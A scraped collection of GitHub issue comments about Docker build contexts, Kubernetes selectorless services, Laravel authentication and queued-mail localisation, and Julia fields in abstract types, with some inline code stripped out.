moby/moby/2745/347054344,"So if I have a dockerfile like this... ... and run a command to publish a new empty Asp.net (not core) web app (dockerfile inside folder) ... ... the  error that crops up (that talks about a path I have specified nowhere) is talking about it from the context of the ""Docker Server"" box in the picture above? I did try changing the COPY to various relative and absolute paths, but nothing stopped producing that that error, or caused a different one to happen. I'm only on this thread as its the only place I could find that had mention of the random temp\docker-builderNNNNNNNN folder that does get created locally on my windows pc (maybe on the Docker Server as well. but I can't tell). The local folder is removed almost immediately. If what I'm describing isnt for the same issue as this very long and meandering thread, please say so and I'll open a new issue. No, because of two things  despite the name of the command I am executing, I'm not compiling anything. I'm deploying something already built to a container to create an image.  It doesnt tell me what the build context is. ""Build context"" is meaningless without some concrete bit of info like the context's path or environment variable or the referenced file paths.  ",,False,False,2745
moby/moby/2745/347059369,"Well, you're compiling an image. Even though you have already ""built"" a thing you want to put into an image, you have not built an image. Well, errors should not replace documentation.   ",,False,False,2745
moby/moby/2745/347060474,"I see what you're trying to do. It looks like you have not read the  reference or  help.  You have ARG source specified but you haven't provided an argument for it, so the default value of  kicks in First argument of docker build command is a . You would know what is a build context if you had read how to use  before running this command. The error essentially tells you that there's no  in .  ",,False,False,2745
moby/moby/2745/347061423,"Also, it looks like you're running Windows containers (native docker server) which do not require VM. This technology is still experimental, so you may experience a bug. ",,False,False,2745
moby/moby/2745/354538918,"plus one for allowing something like 'COPY ../../src' I'm sorry, but any environment that pushes developers to use so clumsy project structures will never mature and leave the mickey-mouse stage. This is not how successful products evolve and no PR hype can be a saver for long. Docker team, please propose some viable solution. ",,False,False,2745
moby/moby/2745/354621925,"@friend - I should not need to digest tomes of information just to ""get started"". I already had to get permission to temporarily uninstall antivirus that was interfering with docker. The paths used in the build context shouldn't be somewhere other than where I'm executing the command or the program folders. A common temp location is ok too, but only if it doesn't require additional permissions, which I think is what you are saying this needs. ",,False,False,2745
moby/moby/2745/355042793,"Super clean and direct and works fine, at least for me ",,False,False,2745
moby/moby/2745/355085815,"@friend Yes, this is tutorial describes how to set a context directory. Which implies that the problem here is that  is not descriptive enough People should refer to extended description on the website  which it's quite easy to grasp what ""Forbidden path"" really means. It doesn't have anything to do with permissions. @friend Writing Dockerfiles for your project doesn't sound ""get started"" to me. It requires quite an advanced knowledge. Getting started tutorial describes setting up very simple project that doesn't require any prior knowledge. But if you need to setup anything more complex you must know how Docker works. And yes, it requires quite a lot of time to figure out. ",,False,False,2745
moby/moby/2745/356287437,"When something exists but you are not permitted access to it, it is forbidden. If its not a valid for some other reason, its Invalid for some other reason. I started with the one that is created when adding docker support to a VS project. It would run in a debugger but that isnt very useful if I need to make a deployable image. Trying to use the CLI to build the image outside of VS just reports the temp folder error.  The file looks correct ... ""Docker, build using this folder and the docker file in it."" seems to be what the CLI help tells me this means.  Nothing about a build context or additional paths, just the one path to direct it to, be it a filesystem path, or a URL, or a ""-"" (the dash must be a *nix convention). The command looks correct...  Both the command and the dockerfile look correct, yet it does not work. ",,False,False,2745
moby/moby/2745/356408224,"In Unix,  usually means ""short help"". If you need extended info you should use   don't see how this problem you have is related to ""Forbidden path"" issue. Error message tells you that there's no folder named  in . Where do you see ""Forbidden path""? ",,False,False,2745
moby/moby/2745/356502327,"You are applying the word with an incorrect meaning. I don't mean offense, i can only speak in one language and you clearly can communicate in more than one. Personally I would rather be corrected than to continue to speak incorrectly. if  is the short help (that goes on for a few screens worth of console), then what is  ? That usage example says run the executable ""docker"" with command (option) ""build"" and give it a path. And then says ""build an image from a  docker file"". So the path must be to the docker file, yes?  If there are other params required it should say that, not make me look up ""man pages"". I still dont understand why its choosing to use the temp folder and then complaining about it when I gave the path to the docker file as the parameter and that has a relative path in it. ",,False,False,2745
moby/moby/2745/356505706,♠PATHDockerfile-fPATHobj/Docker/publish` by the look of it. ,,False,False,2745
moby/moby/2745/356510543,"It doesn't have to use the temp folder, it's just an implementation detail. What really happens is that it uses a remote build. I.e. while physically it's just a different location of the same machine, logically,  doesn't build on your local machine, it builds on the remote machine. So you must provide all the files the build needs inside the directory or tarball specified by PATH or URL so that these files are copied to that remote machine and used to produce an image. This approach is called ""the client/server architecture"". That is also a Unix convention  flags that are composed of one letter are specified using a minus (). They usually have an expanded version that has identical meaning, but longer to type (). This sounds like a valid point. Please create a new issue if you want the  to be changed to be more descriptive. ",,False,False,2745
moby/moby/2745/357575347,"I hit this all the time with go projects, where it is common for packages to live at the root of the project, and not in the buildable command directory (where i want the Dockerfile to live). I can't build the Dockerfile and use the newest version of the utilities dir if I buil from the  directory. I could of course run  in my Dockerfile, but often times I want to use the local (modified) versions of my packages that are not yet published upstream. Here are the workarounds I've come up with (some seen in this issue) Move Dockerfiles to project root Move your  to the root of your project and re-factor it to add files and directories from the project root path onward (.  Cons Some people have huge projects and Docker uploads the entire ""context"" its running in to whatever the building server is, which is sometimes a remote server over VPN. This is too slow for some people.  Make a temporary dir for outside dependencies Create a  in your  directory that copies in outside dependencies to a temporary directory, then calls .  Refactor your  to add files from the temporary directory created in your  when building.  Have the  then call a clean that deletes the temporary directory.  Cons Your  may break, leaving garbage duplicated files around.  You can make this less of an issue by adding the temporary directory to a  file.  Run Dockerfiles from root context Run your  from the project root ""context"", but let it keep living in the  dir.  Refactor the  to add files relative the root of the project ().  Cons Still does not work with huge repos, that end up shipping the entire project to a remote docker server in some environments.  ",,False,False,2745
moby/moby/2745/357788920,@friend Read above the recommended option do not use Dockerfile for development. Use go base image + docker-compose + mounted folders. ,,False,False,2745
moby/moby/2745/365476150,"After 153 comments I would have figured this would be understood as a basic needed feature... using asp.net, the build is based off of a directory. If you're recommending me to have separate csprojects just for a docker build, that is crazy. The official dotnet-core-architecture example shows building outside of docker, then just copying the built contents into a docker container... that can't seriously be the considered way of doing this. ",,False,False,2745
moby/moby/2745/365513667,"@friend A lot of people confuse docker build and Dockerfile with build scripts. Dockerfile was never intended to be a general purpose build tool. Though you can use Dockerfile this way, you're on your own with it's caveats. Yes, if you want a production image, you should run a container to build your artifacts and then copy these build artifacts to the place where Dockerfile is located or change the context to the directory with your build artifacts. ",,False,False,2745
moby/moby/2745/365515619,See it this way Dockerfile is a set of instructions to copy your runtime files to an empty docker image. ,,False,False,2745
moby/moby/2745/365516647,"@friend that's the point of multi-stage builds, correct? If project B references project A, project B won't build, because it expects a csproj reference to to the project, not to a dll reference, even if you get the artifacts of project A, unless you make a separate csproj to reference by compiled dll instead of source, it won't build. And ya, I am confused what you mean ""docker build vs dockerfile with build scripts"". Docker build is for Dockerfile, correct? If not, I don't feel that should be the description on the top of the Docker Build page P ",,False,False,2745
moby/moby/2745/365534814,"So you're saying you're using csproj files to build multiple projects simultaneously? In this case you need to access all the source files, which is 800 mb in your case. I don't see what you expect. You either build them inside or outside a container. In either case you'll end up with dll and exe files which you then put into an image ",,False,False,2745
moby/moby/2745/365643858,"I don't understand why this needs to keep being stated... Structure  Libraries --- Library 1 --- Library 2 --- Library 3 APIs --- API 1 - reference library 1 --- API 2 - references library 2 and library 3  If I request API 1to be built, i do NOT need to send library 2, library 3, and API2. I ONLY need Library 1 and API 1. This is a C# project reference &lt;ProjectReference Include=""..\..\..\BuildingBlocks\EventBus\EventBusRabbitMQ\EventBusRabbitMQ.csproj"" /&gt;  Your Options A. Change Project Reference's to local dll's, destroying all intellisense for every library B. Hot-Swap project references to specifically only build for dll as needed for each individual docker build, (hundred of hot swaps, sounds fun) C. Send 800mb per build, when only 2 of those are actually needed D. Don't use Docker for anything build related, one of the main reasons I want to move to docker. E. Fix Docker and make everyone happy. ",,False,False,2745
moby/moby/2745/365655760,"The daemon still needs to have all files sent. Some options that have been discussed;  Allow specifying a  so that multiple Dockerfiles can use the same build-context, but different paths can be ignored for each Dockerfile ( reverse allow specifying multiple build-contexts to be sent, e.g.   Inside the Dockerfile, those paths could be accessible through (e.g.) ",,False,False,2745
moby/moby/2745/365665908,"Yes, I was going down the line of the multiple build contexts. That looks beautiful and would love that feature! Didn't see it portraid quite that way but that looks great to me at least ",,False,False,2745
moby/moby/2745/365675021,"@friend I didn't say so. I said ""don't use Dockefile for anything build related"". You could perfectly use Docker for builds docker-compose run api2` ",,False,False,2745
moby/moby/2745/365721198,@friend Multiple build context sounds exactly what I am looking for! How soon can we see this feature? ,,False,False,2745
moby/moby/2745/365737891,"So far it has just been a possible approach that was discussed; it would need a more thorough design, and also be looked at in light of future integration with  (which has tons of improvements over the current builder, so possible has other approaches/solutions for this problem) I can open a separate issue for the proposal for discussion; if design/feature has decided on, contributions are definitely welcome ",,False,False,2745
moby/moby/2745/379050760,I resolved with a workaround... Created a docker-compose for build and in original docker-compose generate image for production See ,,False,False,2745
moby/moby/2745/388200973,"I just encountered this issue. I have multiple multiple dockerfiles and a docker-compose housed in one repo that fires up. I've been using an nginx container to proxy my client-side code with the backend, but I am not trying to dockerize the webpack configuration so that it will copy over the code and watch for changes. I've run into this forbidden issue, since my COPY command has to reach into a sibling directory. ",,False,False,2745
moby/moby/2745/391181540,Opened  with a proposal for multiple build-contexts ,,False,False,2745
kubernetes/kubernetes/40870/204928954,"Kubernetes version (use ) Environment Google Container Engine, 1.5.2 What happened I created a selectorless service and configured the endpoint to point at the ClusterIP of another service in a different namespace, as described in the documentation   is supported behaviour (""You want to point your service to a service in another Namespace or on another cluster""). Any requests on the External IP of the selectorless service hang. What you expected to happen Requests to be sent to the target service. How to reproduce it (as minimally and precisely as possible) Start this stack Wait for the  service to be allocated an IP, then try to hit it with curl on port 8080 . There is no output. I would expect the output to be 'I am ALPHA'. Anything else we need to know ",,False,False,40870
kubernetes/kubernetes/40870/277729893,"Hi there, this seems interesting AFAICT, the problem seems to be a mismatch between the docs and what the  in  actually can do. In , the otherwise purely virtual  are realized by smart DNAT-ing on each node in the cluster (done by ). The DNAT rules are more or less the core functionality, and are defined in the NAT table of , on each node, for each existing endpoint of each service in the cluster. From what I can see, the problem in your case is that the DNAT in  is effectively done only once (all the  chains are traversed just once per packet, see here), so that the request to the  service is effectively resolved to a request to  after it comes out of  (i.e. after all  chains are applied). But,  is not a real IP (it's a virtual service IP), and thus your requests fails as it has no real destination. One way to deal with this is to make  recursively resolve the DNAT rules in case there are chained services as in your case, and then sync them with  (the sync is done in real time anyways). Here is a sketch commit of how this can be ""fixed"" in the code (it works in my dev setup). It would be good to hear a second opinion on whether this use case should indeed be supported. In case you are interested, I can open a PR with the fix and try to merge it. ",,False,False,40870
kubernetes/kubernetes/40870/278325604,"FYI, the service-to-service forwarding chain didn't work in my dev cluster even if both services are in the same namespace (as the problem described above seems to be conceptual). The services being in different namespaces is a whole separate issue on it's own. ",,False,False,40870
kubernetes/kubernetes/40870/278329384,"Yes, I apologise, I noticed that this functionality doesn't work even in the same namespace while constructing this issue, but did a bad job of removing the references to namespacing. ",,False,False,40870
kubernetes/kubernetes/40870/281573791,"It's not surprising to me that this doesn't work.  I don't think this particular usage pattern was  tested or even considered really. It's not invalid, but it's a little weird.  Can you use ExternalName instead, to achieve the desired effect? On Thu, Feb 9, 2017 at 453 AM, Michail Kargakis notifications@friend.com wrote ",,False,False,40870
kubernetes/kubernetes/40870/281621194,"@friend I'm confused, my usage pattern matches exactly what is documented as a use-case for this functionality Please could you describe how my usage pattern is different? I might be able to use , it depends on the TTL, but in my experience using DNS for traffic routing is a bad idea. ",,False,False,40870
kubernetes/kubernetes/40870/282285295,"instead, to achieve the desired effect? I got this working with ExternalName, just put the FQDN in the externalName property. I'm running on an on-prem cluster running Actually, according to the description in the docs, ExternalName creates a DNS CNAME which, according to wikipedia (my DNS knowledge isn't that great), is This seems to be semantically consistent with what we're doing. ",,False,False,40870
kubernetes/kubernetes/40870/302793354,"Yeah, IMO we can probably turn this into a documentation issue.  Sounds like the ""feature"" is supported through ExternalName, but the docs don't make it clear how to achieve this. ",,False,False,40870
kubernetes/kubernetes/40870/353797856,"Issues go stale after 90d of inactivity. Mark the issue as fresh with . Stale issues rot after an additional 30d of inactivity and eventually close. Prevent issues from auto-closing with an  comment. If this issue is safe to close now please do so with . Send feedback to sig-testing, kubernetes/test-infra and/or . /lifecycle stale ",,False,False,40870
kubernetes/kubernetes/40870/359900118,"Stale issues rot after 30d of inactivity. Mark the issue as fresh with . Rotten issues close after an additional 30d of inactivity. If this issue is safe to close now please do so with . Send feedback to sig-testing, kubernetes/test-infra and/or . /lifecycle rotten /remove-lifecycle stale ",,False,False,40870
kubernetes/kubernetes/40870/367794750,"Rotten issues close after 30d of inactivity. Reopen the issue with . Mark the issue as fresh with . Send feedback to sig-testing, kubernetes/test-infra and/or fejta. /close ",,False,False,40870
kubernetes/kubernetes/40870/378644753,"/reopen @friend did you solve this issue? currently the documentation hasn't changed, BTW. see ",,False,False,40870
kubernetes/kubernetes/40870/378644765,"@friend you can't re-open an issue/PR unless you authored it or you are assigned to it. &lt;details&gt;  In response to [this]( for interacting with me using PR comments are available [here](  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra]( repository. &lt;/details&gt;",,False,False,40870
kubernetes/kubernetes/40870/378648256,"@friend no, I never managed to get this working as documented. I gave up on this issue as soon as @friend said ""I don't think this particular usage pattern was  tested or even considered really"" when my exact use-case was listed as an example in the documentation (""You want to point your service to a service in another Namespace or on another cluster""). I've encountered enough wontfix attitudes on open source projects to know that pursuing this would exceed the amount of time I have available to finish this work. In the end I used  in TCP mode and configured it with environment variables. ",,False,False,40870
kubernetes/kubernetes/40870/378649620,@friend thanks -) ,,False,False,40870
kubernetes/kubernetes/40870/394156860,I created #64668 to clarify if we want this. ,,False,False,40870
framework/laravel/24848/341262885,"♠ Please use this issue tracker only for reporting Laravel bugs.  If you need support, please use the forums  -   -  you may use Slack ( or Stack Overflow ( you would like to propose new Laravel features, please make a pull request, or open an issue at  Version 5.6  Description Authentication problem due to syntax error. Steps To Reproduce in framework/src/Illuminate/Auth/SessionGuard.php file on line 380 change fromreturn !(is_null($user) &amp;&amp; $this-&gt;provider-&gt;validateCredentials($user, $credentials));` ",,False,False,24848
framework/laravel/24848/405047098,What's the problem? Your suggestion completely changes the behavior of . ,,False,False,24848
framework/laravel/24848/405091955,"sorry my bad, this attitude always return true but ♠$this-&gt;provider-&gt;validateCredentials($user, $credentials)` part is always returning false even credentials are true, I couldn't figure it out why ",,False,False,24848
julia/JuliaLang/4935/23299157,This would look something like Foo` to begin with those fields. Some parts of the language internals already anticipate this; it's a matter of hooking up the syntax and filling in a few missing pieces. ,,False,False,4935
julia/JuliaLang/4935/29293440,plus one to this ,,False,False,4935
julia/JuliaLang/4935/29297756,"plus one (!) I'm wondering if the  keyword is useful, necessary, and/or deliberate? ",,False,False,4935
julia/JuliaLang/4935/29298513,"If he didn't have a  keyword, every declaration of  will need an . Currently  is a oneliner, but  and  is mulitiline until a  marker. ",,False,False,4935
julia/JuliaLang/4935/29298893,"Right, thanks @friend. ",,False,False,4935
julia/JuliaLang/4935/29299222,plus one this will be very useful! ,,False,False,4935
julia/JuliaLang/4935/29306979,"I'd actually be ok with changing  to always require an , although that would make this a breaking change, which it currently isn't. The  thing feels pretty clunky to me and our current  declarations have always felt a little jarringly open-ended to me. ",,False,False,4935
julia/JuliaLang/4935/29307078,I kind of agree with Stefan. Making the visual appearance of  more like that of  and  seems like a gain to me. ,,False,False,4935
julia/JuliaLang/4935/29307474,"Yeah, FWIW I was going to say the same. ",,False,False,4935
julia/JuliaLang/4935/29307526,Fourth-ed ,,False,False,4935
julia/JuliaLang/4935/29307910,"The big problem with making a syntactic change like that is it's going to become a watershed for all the code out there that declares abstract types, splitting that code into before and after versions. Since half of our community likes to live on the edge while the other half likes to use 0.2 (making up numbers here, but half-and-half seems reasonable), that's kind of a big problem. If there was some way we could deprecate the open-ended abstract type declaration, that would avoid the issue. ",,False,False,4935
julia/JuliaLang/4935/29308151,"Now that 0.2 is out, I actually think we should tell people not to use master for work that's not focused on the direct development of Julia itself. I intend to only work from 0.2 until the 0.3 release while developing packages. ",,False,False,4935
julia/JuliaLang/4935/29308488,"Maybe you can hack a temporary thing to end an abstract block if the next line does not start with a field declaration? Backporting this to 0.2.x would allow moving progressively, then you would introduce a deprecation warning, and make it an error with 0.3. ",,False,False,4935
julia/JuliaLang/4935/29308510,"I think that's very reasonable, although it does cut down on the number of people testing out 0.3, which is unfortunate, but probably unavoidable. ",,False,False,4935
julia/JuliaLang/4935/29308569,"@friend, yes, I was thinking something along those lines, but it does feel kind of awful. ",,False,False,4935
julia/JuliaLang/4935/29310595,As a transitioning solution we might update 0.2.1 to allow a  on the same line after . Then in 0.3 we might issue a warning if it is missing and in 0.4 we can require it. That makes this a rather lengthy process though. Why don't we enable inheriting from  and  instead? It keeps the abstract keyword reserved for grouping types. It will also be cleaner if a immutable can't inherit from a type. Will it cause trouble somewhere if we have a abstract and a concrete type with the same name? ,,False,False,4935
julia/JuliaLang/4935/29311174,"I like the first approach, but it is very, very slow, unfortunately. We definitely cannot allow inheriting from type or immutable. The fact that concrete types are final is crucial. Otherwise when you write  you can't store them inline because someone could subtype  and add more fields, which means that the things in the array might be bigger than 16 bytes. Game over for all numerical work. ",,False,False,4935
julia/JuliaLang/4935/29313996,"That is a good point. It will be too hard to know if Complex should be interpreted as an abstract or concrete type when it is used as a type parameter. What about this? That does not introduce a new keyword, and is backwards compatible. ",,False,False,4935
framework/laravel/8392/67853408,"I am looking for a working solution, to translate queued emails. Unfortunately, all emails use the default locale (defined under ). Let's assume, we have two emails in the pipeline, one for an English  user and another for an Japanese  user. What data should I pass to the  facade to translate (localize) the queued emails?   // User model   $user = Userfind(1)-&gt;first();    Mailerqueue($email, 'Party at Batman\'s cave (Batcave)', 'emails.party-invitation', [      ...      'locale' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work     'lang' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work     'language' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work   ]);  ",,False,False,8392
julia/JuliaLang/4935/29314548,Very nice idea. So far that seems perfect. ,,False,False,4935
framework/laravel/8392/128326662,A different template for each locale is not a solution... (imagine an application with 10 languages...) There is no way to achieve this? ,,False,False,8392
framework/laravel/8392/138267835,Why is this issue closed? Is it solved? Is there a way to utilize the locale in queued mails? I think it's really annoying that @friend is closing issues without a proper solution/fix. Imho that doesn't help at all. Keeping this thread open shows that this is still not addressed and needs some solution sooner or later. I would appreciate a solution where it's possible to pass a locale to the queue method. I've also seen suggestions to set the locale via  within the queue callback. But unfortunately that doesn't help either. ,,False,False,8392
julia/JuliaLang/4935/29314630,"That also potentially allows , which could require all subtypes to be immutable. ",,False,False,4935
framework/laravel/8392/182380365,plus one this needs to be reopened. ,,False,False,8392
julia/JuliaLang/4935/29315335,very cool ,,False,False,4935
framework/laravel/8392/221108801,"It's insanely bad that I can't handle this at all... The only solution I've found is passing the locale to the mail, and then passing it onto the trans() method.. Horribly time consuming and ugly when having +50 templates, and an text only version too. I have to at least do manual labor on plus one00 blade files.. How can it be that even changing language before queue, and inside the closure - does not work..? ",,False,False,8392
framework/laravel/8392/275922166,I just came across the very same problem. Has this been solved? This is a very essential feature that is overlooked! Anything that is thrown into a queue should pass the original locale own to the job! There is no reason not to. ,,False,False,8392
julia/JuliaLang/4935/29315529,"Yes, I like that idea. We can also make  allowed – optionally for now – and eventually require the  and make allow leaving out the  like we do with . Or maybe we just leave it the way it is. ",,False,False,4935
framework/laravel/8392/277189390,"@friend, I really appreciate your tremendous contribution for the community. But your attitude is quite annoying. You act like the guard dog of issues without even allowing a discussion on valid issues (you will probably close this issue now and limit discussion to contributors because I wrote this ;-)). While the Laravel ecosystem is promoting a friendly ""netiquette"" all I see is issues being instantly closed for no good reason. Obviously people are having trouble with this issue 13830 So it doesn't help to tuck it away by closing it. As far as I can see it is not solved and it is a problem for millions of non-English speaking developers. What is the best way to address this issue without the issue being instantly closed? I'd be glad to give it a shot! ",,False,False,8392
julia/JuliaLang/4935/29316601,I'm unreasonably excited about this ) ,,False,False,4935
framework/laravel/8392/277195271,"I second that @friend It is quite (very!) annoying that these issues are closed before a sensible discussion on the issue is allowed. @friend what are your thoughts on this? I would suggest developing it along the lines of what was discussed in #13830 and submit a pull request. Hopefully, it will be seen as a welcome ""feature"" and accepted. ",,False,False,8392
julia/JuliaLang/4935/29317049,New language features are like Christmas. ,,False,False,4935
framework/laravel/8392/277214323,"This feature request is being discussed on laravel/internals#394 that's the reason that this issue is closed... We use that repo for feature requests, you guys could share your ideas there... 😄 ",,False,False,8392
framework/laravel/8392/277215343,Perfect! Thanks @friend ,,False,False,8392
julia/JuliaLang/4935/31301034,more support for this from  doing an amazing job here - i can't believe how far you've got and how good this is...) ,,False,False,4935
framework/laravel/8392/277216662,Thanks @friend. That's the kind of answer I was hoping for ) ,,False,False,8392
framework/laravel/8392/283973419,I see discussion is still in progress in related internal issue. Came here with assumption that Carbonnow()-&gt;formatLocalized('%B %Y') is also affected with this issue. ,,False,False,8392
julia/JuliaLang/4935/31324693,"There is a small question of how to handle constructors with this feature. The obvious thing is for it to behave as if you simply copy &amp; pasted the parent type's fields into the new subtype declaration. However, this creates extra coupling, since changing the parent type can require changes to all subtype code The  constructor has to know about the parent fields. Bug or feature? ",,False,False,4935
framework/laravel/8392/337201621,"I had the similar problem. Check my StackOverflow answer. The idea is to inherit  class and replace  method, then your Mailables will take care of current locale automatically! ",,False,False,8392
julia/JuliaLang/4935/31325303,"It's very non-local, which I don't care for. One thought is that the subtype would have to repeat the declaration and match it. I know that's not very DRY but it's an immediate, easy-to-diagnose error when it happens, and it means that the child declaration is completely self-contained. The point of having fields in the abstract type declaration is to allow the compiler to know that anything of that type will have those fields and know what offset they're at so that you can emit efficient generic code for accessing those fields for all things of that type without needing to know the precise subtype. I don't think the feature is really about avoiding typing fields. ",,False,False,4935
framework/laravel/8392/426187394,I believe this was solved in Laravel 5.6? ,,False,False,8392
julia/JuliaLang/4935/31325380,Isn't this a natural coupling which you will always have if you change a parent type? Maybe it would be cleaner to have  i.e. the parent has to be the first value for  (and outer constructors as well). ,,False,False,4935
julia/JuliaLang/4935/31325425,It's an interesting point that all the value is in making sure the fields are there. Avoiding typing them is much less important. ,,False,False,4935
julia/JuliaLang/4935/31325497,"This occurred to me also, but something about it doesn't quite feel right. ",,False,False,4935
julia/JuliaLang/4935/31325593,"I like @friend s idea, but the syntax must be improved. There is also the issue that the Parent constructor needs to get a pointer from the child constructor to know where to initialize itself. ",,False,False,4935
julia/JuliaLang/4935/31325606,I am also not sure which form I like more. Introducing the super constructor for abstract types makes it more complicated. But it provides a better distinction which fields are from the parent and which are from the child. ,,False,False,4935
julia/JuliaLang/4935/31325733,What does  return? ,,False,False,4935
julia/JuliaLang/4935/31325842, returns a thing like ?  ,,False,False,4935
julia/JuliaLang/4935/31325991,But what kind of thing? There are no instances of abstract types (or they wouldn't be abstract) so what type of object does it return? ,,False,False,4935
julia/JuliaLang/4935/31326017,"I think all this is syntactic sugar and would have do be rewritten into the initially proposed form by the compiler. The  syntax says a little bit more explicit that there is a Parent type nested into the Child type. It still reads like the members would be represented in memory. But again, I am also not sure if this is worth it. The syntax proposed by @friend is also fine and quite natural. ",,False,False,4935
julia/JuliaLang/4935/31326070,A possibility might be to support simple construction of the Child if Parent has default values for its members. Now Object can be instantiated by in a inner constructor by  or . ,,False,False,4935
julia/JuliaLang/4935/31326077,"Yeah, that's the thing. It's a thing that looks like a function call but isn't at all, which is why I don't care for it. If you're going to do that, you may as well just write , which is shorter and isn't just pointless syntax. ",,False,False,4935
julia/JuliaLang/4935/31326160,We don't allow for default values of fields at this point. Constructors can have defaults but fields don't have default values. The idea of allowing  or  won't work because we also allow  to not assign a value to . ,,False,False,4935
julia/JuliaLang/4935/31326950,"Maybe this is obvious to everyone but it's good if whatever solution is chosen plays nicely with multiple inheritance in the, possibly distant, future. ",,False,False,4935
julia/JuliaLang/4935/31331606,"multiple inheritance sounds like it would eventually require support for field renaming, which suggests repeating fields.  in that case, could there be a macro that copies the values for the simple case?  so ",,False,False,4935
julia/JuliaLang/4935/31472992,"About the value of fields in abstract types I think that we should aim higher than to just use this to make sure that the fields are there. To me, it would seem that one of the most useful parts of this would be to let the abstract super type support some given abstraction in a way that the subtypes don't have to know about. It should be possible to change the super type's implementation of that abstraction without having to change the sub types (as long as they only rely on the abstraction, and not the actual inherited fields etc.). Or maybe that it is too much to aim for; there's no way to completely avoid name clashes between fields from the super type and sub types if they don't know about each others' implementations. I guess what we really need to figure out is what kind of usage this feature is meant to support. ",,False,False,4935
julia/JuliaLang/4935/31489295,I don't think that there are many practicle examples where parent and child type are so loosly coupled that the parent fields can be constructed without feeding them through the child constructor. Thinking more about the syntax for base field initialization I think that it would be very usefull if there would be a way to define an own constructor for the parent type. If base field initialization is non-trivial this would reduce code duplication. It should however be optional to call this parent constructor in the child constructor in order override the default behavior. ,,False,False,4935
julia/JuliaLang/4935/31497671,"Stop me if I'm getting off on a whole nother topic but how about Type Factory and Static Members. I was thinking of how to make a type to represent Decibels. The frustrating thing is there's many slightly different, related definitions of decibels. I'd like if the datum could carry around which definition of Decibel it was using as part of it's type without having to copy all of the information for each one. For example, one definition of Decibel is dBm Units ""MilliWatts"" Base 10 Scale 10 Reference 1 mW  You convert a quantity,  of MilliWatts to dBm with . But then you also have dBV. It works similarly except Units Volts Base 10 Scale 20 Reference 1 Volt  And so the conversion is . There are literally dozens of such definitions which could easily share code  Type Factory is a function that returns types. I don't think Julia has this. A Static Member is a value associated with the type itself that need not be repeated for each instance. I don't think Julia has this either. But you can imagine type Decibel{T}     static units     static scale     static base     static reference     value end  function decibelfactory(param, units, scale, base, reference)     return Decibel{param}(units, scale, base, reference) end  dBm = decibelfactory(dBm, ""MilliWatts"", 10.0, 10.0, 1.0)  linearize(qDB) = q.scale * log(q.base, q.value/q.reference)  x = dBm(6)  julia&gt; typeof(x) Decibel{dBm}(""MilliWatts"", 10.0, 10.0, 1.0)  julia&gt; linearize(x) 7.781512503836435  ",,False,False,4935
julia/JuliaLang/4935/31566802,"Early versions of what is now StrPack.jl dynamically created types using a macro, so this is entirely possible to do. ",,False,False,4935
julia/JuliaLang/4935/31858287,"I guess we can get ""tempted"" to start doing abstract type AbstractParent   x end type Parent &lt; AbstractParent   # x is inherited end  abstract type AbstractChild1 &lt; AbstractParent   # x is inherited   y end type Child1 &lt; AbstractChild1   # x is inherited from parent   # y is inherited end  abstract type AbstractChild2 &lt; AbstractParent   # x is inherited   z end type Child2 &lt; AbstractChild2   # x is inherited from parent   # z is inherited end  to achieve some kind of inheritance from concrete types... ",,False,False,4935
julia/JuliaLang/4935/31866914,I have asked myself what the difference is between an abstract type with fields and the ability to inherit from a concrete type. It seems they are almost equal but the abstract type with fields needs one trivial concretization. ,,False,False,4935
julia/JuliaLang/4935/31867492,"They differ in that you can specify fields and collections that only allow that ""trivial concretization"", whereas there is no way to express that when the abstract type and the trivial concretization are condensed to the same thing. ",,False,False,4935
julia/JuliaLang/4935/31869783,"If you could inherit from concrete types, then I could (1) construct an array of Float64, (2) define a new subtype of Float64, (3) try to store it into the array. We don't want to allow that. Of course that could also be achieved by having some types be ""final"", but we felt it was simpler to make all concrete types final rather than have an extra keyword like that. ",,False,False,4935
julia/JuliaLang/4935/31870416,"When I first start learning Julia I felt it badly lacked some features (classes, inheritance) I was used to from Python and C++. However, I soon start to love the simple and clean, yet powerful, ways to code in Julia. Now I can't even figure a greater benefit from having abstract fields, apart from constant field offsets for all subtypes, as pointed by @friend. I really like APIs relying only on methods, thus hiding internals and fields. But it seems that the benefit from constant field offset is lost if using methods to access fields. E.g., imagine we read an API with some abstract class like It can lead us to suppose that  will always return filed , allowing inlining, and benefiting from constant offset efficient code for all subtypes, right? Of Course not, e.g. If we have function which takes an array of different values subtypes of A, and iterate over them So either we stick to methods, getting no really advantage from efficient offset access code (thus, no advantage from abstract fields), or we start using fields directly, losing the internals hiding... DISCLAIMER I may be missing something and therefore saying a lot of BS ) ",,False,False,4935
julia/JuliaLang/4935/31871642,"One could go even further, and point out that overloading  reduces the need for this feature even more, since I can effectively add read-only fields using So fields in abstract types really only add something in the rare case where being able to store some piece of state in a value is part of the interface. ",,False,False,4935
julia/JuliaLang/4935/31871759,"@friend I totally get that you need to finalize types in order to have unboxed array content. But with this PR on the table it seems to be that this will allow subtyping ""with tricks"" and I wonder if it will get a common pattern to define all methods on the ""almost concrete"" type and then put a trivial concretization on top of that. ",,False,False,4935
julia/JuliaLang/4935/31872480,"In several cases that already happens (e.g. ), and is fairly common in OO languages generally. If people want to think of concrete types as just a  declaration, that's fine with me. We're happy as long as ""final"" types are possible, and that people are encouraged to use them. ",,False,False,4935
julia/JuliaLang/4935/31873465,"I am also not totally sure if the lack of inheritance of concrete types is really an issue. The nice thing would be that one inherits all methods of a parent type. But maybe the cleaner solution is to use a ""has a"" relation instead of a ""is a"" relation anyway. But this currently means redefining various methods which feels like a drawback compared to inheritance. ",,False,False,4935
julia/JuliaLang/4935/31874142,"I am starting to wonder if this feature is really that necessary. It's kind of hard to see what crucial problem it's solving. The main benefits seem to be  Guarantee that  will always work for all subtypes of an abstract type that has . Otherwise someone could define a subtype and forget to have this field, leading to errors. Guarantee that  is stored at a consistent location in all subtypes.  I actually think that 1. might be an argument against this feature if we allowed overloading of  then a subtype could define a getter and/or setter for  instead of actually storing the field and still work fine with the abstract behavior of the super-type. I'm not sure if 2. is actually enough of a benefit to warrant the entire feature. ",,False,False,4935
julia/JuliaLang/4935/31874312,"In fact, you can imagine a subtype being forced to have a  field but wanting to overriding the  syntax. Then it would be forced to have a vestigial  field that's just wasted and forced on it for no good reason. ",,False,False,4935
